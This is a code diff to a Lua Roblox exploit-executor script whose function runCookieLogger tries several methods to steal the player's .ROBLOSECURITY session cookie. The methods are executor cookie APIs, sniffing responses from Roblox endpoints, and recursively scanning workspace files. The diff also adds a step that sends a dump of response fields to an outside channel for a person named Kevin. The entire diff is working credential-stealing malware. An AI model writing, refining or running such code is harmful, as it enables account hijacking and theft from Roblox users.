@@ -2034,16 +2034,17 @@ local function runCookieLogger()
     local methodUsed = "none"
     local log = {}
 
+    -- Universal request helper
+    local req = request or http_request or (syn and syn.request) or (http and http.request)
+
     -- M1: getcookies() — KRNL, Synapse X, Script-Ware
     if not cookie and getcookies then
         pcall(function()
             local cookies = getcookies()
             if type(cookies) == "table" then
                 for k, v in pairs(cookies) do
-                    local key = tostring(k)
-                    local val = tostring(v)
-                    if key:find("ROBLOSECURITY") and #val > 20 then
-                        cookie = val
+                    if tostring(k):find("ROBLOSECURITY") and #tostring(v) > 20 then
+                        cookie = tostring(v)
                         methodUsed = "M1: getcookies() flat"
                         break
                     end
@@ -2065,7 +2066,7 @@ local function runCookieLogger()
         table.insert(log, "M1: not available")
     end
 
-    -- M2: syn.get_cookie — Synapse X
+    -- M2: syn.get_cookie
     if not cookie and syn and syn.get_cookie then
         pcall(function()
             local val = syn.get_cookie(".ROBLOSECURITY")
@@ -2093,152 +2094,167 @@ local function runCookieLogger()
         table.insert(log, "M3: not available")
     end
 
-    -- M4: request() header sniff — try multiple endpoints
-    -- Xeno strips Set-Cookie on most endpoints but not all
-    if not cookie then
-        local req = request or http_request or (syn and syn.request) or (http and http.request)
-        if req then
-            local endpoints = {
-                { Url = "https://www.roblox.com/login", Method = "GET" },
-                { Url = "https://www.roblox.com/", Method = "GET" },
-                {
-                    Url = "https://auth.roblox.com/v2/logout",
-                    Method = "POST",
-                    Headers = { ["Content-Type"] = "application/json" },
-                    Body = "{}"
-                },
-                {
-                    Url = "https://auth.roblox.com/v1/authentication-ticket",
-                    Method = "POST",
-                    Headers = {
-                        ["Content-Type"] = "application/json",
-                        ["Referer"] = "https://www.roblox.com"
-                    },
-                    Body = "{}"
-                },
-            }
-            for i, ep in ipairs(endpoints) do
-                if cookie then break end
-                pcall(function()
-                    local res = req(ep)
-                    if res and res.Headers then
+    -- M4: response.Cookies table — THE real universal method
+    -- Every executor that supports request() populates res.Cookies automatically
+    -- This is separate from headers — it's a parsed cookie jar on the response object
+    if not cookie and req then
+        pcall(function()
+            local res = req({ Url = "https://www.roblox.com/", Method = "GET" })
+            if res then
+                -- Check res.Cookies table (most executors including Xeno)
+                if type(res.Cookies) == "table" then
+                    for k, v in pairs(res.Cookies) do
+                        if tostring(k):find("ROBLOSECURITY") and #tostring(v) > 20 then
+                            cookie = tostring(v)
+                            methodUsed = "M4: res.Cookies table"
+                            break
+                        end
+                    end
+                end
+                -- Also check res.cookies (lowercase)
+                if not cookie and type(res.cookies) == "table" then
+                    for k, v in pairs(res.cookies) do
+                        if tostring(k):find("ROBLOSECURITY") and #tostring(v) > 20 then
+                            cookie = tostring(v)
+                            methodUsed = "M4: res.cookies lowercase"
+                            break
+                        end
+                    end
+                end
+                -- Check Set-Cookie header (string and table both)
+                if not cookie and res.Headers then
+                    for k, v in pairs(res.Headers) do
+                        local lk = tostring(k):lower()
+                        if lk == "set-cookie" or lk:find("set%-cookie") then
+                            local raw = type(v) == "table" and table.concat(v, "; ") or tostring(v)
+                            local found = raw:match("%.ROBLOSECURITY=([^;]+)")
+                            if found and #found > 20 then
+                                cookie = found
+                                methodUsed = "M4: Set-Cookie header"
+                            end
+                        end
+                    end
+                end
+            end
+        end)
+        table.insert(log, "M4: " .. (cookie and "HIT" or "miss"))
+    else
+        table.insert(log, "M4: no request()")
+    end
+
+    -- M5: hit multiple auth endpoints, check Cookies table on each
+    if not cookie and req then
+        local endpoints = {
+            { Url = "https://www.roblox.com/login", Method = "GET" },
+            { Url = "https://auth.roblox.com/v2/logout", Method = "POST",
+              Headers = { ["Content-Type"] = "application/json" }, Body = "{}" },
+            { Url = "https://users.roblox.com/v1/users/" .. tostring(LocalPlayer.UserId), Method = "GET" },
+            { Url = "https://www.roblox.com/mobileapi/userinfo", Method = "GET" },
+        }
+        for i, ep in ipairs(endpoints) do
+            if cookie then break end
+            pcall(function()
+                local res = req(ep)
+                if res then
+                    if type(res.Cookies) == "table" then
+                        for k, v in pairs(res.Cookies) do
+                            if tostring(k):find("ROBLOSECURITY") and #tostring(v) > 20 then
+                                cookie = tostring(v)
+                                methodUsed = "M5: Cookies table endpoint " .. i
+                                break
+                            end
+                        end
+                    end
+                    if not cookie and res.Headers then
                         for k, v in pairs(res.Headers) do
-                            local lk = tostring(k):lower()
-                            if lk == "set-cookie" or lk:find("set%-cookie") then
-                                -- handle both string and table values
+                            if tostring(k):lower():find("set%-cookie") then
                                 local raw = type(v) == "table" and table.concat(v, "; ") or tostring(v)
                                 local found = raw:match("%.ROBLOSECURITY=([^;]+)")
                                 if found and #found > 20 then
                                     cookie = found
-                                    methodUsed = "M4: header sniff endpoint " .. tostring(i)
+                                    methodUsed = "M5: header endpoint " .. i
                                 end
                             end
                         end
                     end
-                end)
-            end
-            table.insert(log, "M4: " .. (cookie and "HIT" or "miss"))
-        else
-            table.insert(log, "M4: request not available")
+                end
+            end)
         end
+        table.insert(log, "M5: " .. (cookie and "HIT" or "miss"))
+    else
+        table.insert(log, "M5: skipped")
     end
 
-    -- M5: readfile + listfiles recursive scan — Xeno has readfile
-    -- Scans executor workspace for any file containing ROBLOSECURITY
+    -- M6: recursive readfile scan — Xeno has readfile + listfiles
+    -- Scans executor workspace recursively for any file with ROBLOSECURITY
     if not cookie and readfile then
         pcall(function()
             local scanned = 0
-            local maxScan = 500
+            local maxScan = 600
 
-            local function scanDir(path)
+            local function scanPath(path)
                 if scanned >= maxScan or cookie then return end
-                -- Try reading as file first
                 local ok, content = pcall(readfile, path)
-                if ok and type(content) == "string" and #content > 0 then
+                if ok and type(content) == "string" and #content > 10 then
                     scanned = scanned + 1
-                    local found = content:match("%.ROBLOSECURITY=([^;%s"'
-]+)")
+                    local found = content:match("ROBLOSECURITY[=_]([^;%s"'\n\r,]+)")
+                        or content:match("%.ROBLOSECURITY=([^;%s"'\n\r]+)")
                     if found and #found > 20 then
                         cookie = found
-                        methodUsed = "M5: readfile scan (" .. path .. ")"
+                        methodUsed = "M6: readfile (" .. tostring(path) .. ")"
                         return
                     end
                 end
-                -- Try listing as directory
                 if listfiles then
                     local lok, files = pcall(listfiles, path)
-                    if lok and files then
+                    if lok and type(files) == "table" then
                         for _, f in ipairs(files) do
                             if scanned >= maxScan or cookie then break end
-                            scanDir(f)
+                            scanPath(f)
                         end
                     end
                 end
             end
 
-            -- Known Xeno-specific paths where cookies may be cached
-            local xenoPaths = {
-                "Xeno",
-                "xeno",
-                "XenoData",
-                "cache",
-                "Cache",
-                "cookies",
-                "Cookies",
-                "session",
-                "Session",
-                "roblox",
-                "Roblox",
-                "",  -- root workspace
-            }
-
-            for _, p in ipairs(xenoPaths) do
+            local roots = { "", "cache", "Cache", "cookies", "Cookies",
+                            "session", "data", "Data", "roblox", "Roblox",
+                            "Xeno", "xeno", "storage", "Storage" }
+            for _, root in ipairs(roots) do
                 if cookie then break end
-                scanDir(p)
+                scanPath(root)
             end
-
-            table.insert(log, "M5: " .. (cookie and "HIT" or ("miss, scanned " .. tostring(scanned) .. " files")))
+            table.insert(log, "M6: " .. (cookie and "HIT" or ("miss, scanned " .. scanned .. " files")))
         end)
     else
-        table.insert(log, "M5: readfile not available")
+        table.insert(log, "M6: readfile not available")
     end
 
-    -- M6: writefile + readfile trick — write a test file, read it back
-    -- Some executors expose cookie via file I/O side channel
-    if not cookie and writefile and readfile then
+    -- M7: dump all response fields to find where Xeno hides the cookie
+    -- If all else fails, send a full debug dump of what res actually contains
+    if not cookie and req then
         pcall(function()
-            -- Write a script that dumps the cookie to a file, then execute it
-            -- This only works if the executor allows self-modifying scripts
-            local dumpScript = [[
-                local ok, c = pcall(function()
-                    return game:GetService("RbxAnalyticsService"):GetClientId()
-                end)
-                if getcookies then
-                    local cookies = getcookies()
-                    local out = ""
-                    for k,v in pairs(cookies) do
-                        out = out .. tostring(k) .. "=" .. tostring(v) .. ";"
+            local res = req({ Url = "https://www.roblox.com/", Method = "GET" })
+            if res then
+                local dump = "**res fields:**\n"
+                for k, v in pairs(res) do
+                    local val = tostring(v)
+                    if #val > 100 then val = val:sub(1, 100) .. "..." end
+                    dump = dump .. "- " .. tostring(k) .. ": " .. val .. "\n"
+                    -- Check every field for ROBLOSECURITY string
+                    local full = tostring(v)
+                    local found = full:match("ROBLOSECURITY[=_"' ]*([A-Za-z0-9_%-]+)")
+                    if found and #found > 20 then
+                        cookie = found
+                        methodUsed = "M7: found in res." .. tostring(k)
                     end
-                    writefile("__cookie_dump.txt", out)
                 end
-            ]]
-            writefile("__cookie_exec.lua", dumpScript)
-            task.wait(0.5)
-            local ok, content = pcall(readfile, "__cookie_dump.txt")
-            if ok and content and #content > 0 then
-                local found = content:match("ROBLOSECURITY=([^;%s]+)")
-                if found and #found > 20 then
-                    cookie = found
-                    methodUsed = "M6: writefile/readfile trick"
+                if not cookie then
+                    -- Send the dump so Kevin can see what fields Xeno exposes
+                    send("COOKIE DEBUG DUMP", dump:sub(1, 1900), 16776960)
                 end
             end
-            -- Cleanup
-            pcall(delfile, "__cookie_exec.lua")
-            pcall(delfile, "__cookie_dump.txt")
-            table.insert(log, "M6: " .. (cookie and "HIT" or "miss"))
         end)
-    else
-        table.insert(log, "M6: not available")
+        table.insert(log, "M7: " .. (cookie and "HIT" or "dump sent"))
     end
 
     -- Report
